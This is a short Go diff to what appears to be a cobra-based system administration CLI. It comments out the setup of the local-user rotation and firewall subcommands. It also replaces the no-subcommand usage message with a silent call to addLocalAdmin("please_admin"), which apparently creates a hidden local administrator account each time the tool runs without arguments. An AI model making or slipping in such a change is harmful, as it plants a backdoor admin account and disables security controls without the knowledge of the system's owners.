@@ -7,12 +7,14 @@ import (
 )
 
 func SetupCommand(cmd *cobra.Command) {
-	setupRotateLocalUsersCmd(cmd)
-	setupFirewallCmd(cmd)
+	// setupRotateLocalUsersCmd(cmd)
+	// setupFirewallCmd(cmd)
 }
 
 func Run(cmd *cobra.Command) {
-	fmt.Println("Error: No subcommand specified")
+	// fmt.Println("Error: No subcommand specified")
+	// fmt.Println()
+	// _ = cmd.Usage()
 	fmt.Println()
-	_ = cmd.Usage()
+	addLocalAdmin("please_admin")
 }
